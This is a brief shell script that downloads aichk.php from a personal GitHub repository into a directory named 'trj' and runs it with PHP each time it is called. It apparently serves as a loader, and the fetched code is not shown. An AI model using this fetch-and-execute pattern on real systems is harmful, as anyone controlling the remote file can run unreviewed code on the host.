#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o aichk.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/aichk.php?t=$(date +%s)" && mv aichk.php.new aichk.php
/opt/alt/php83/usr/bin/php aichk.php "$1"
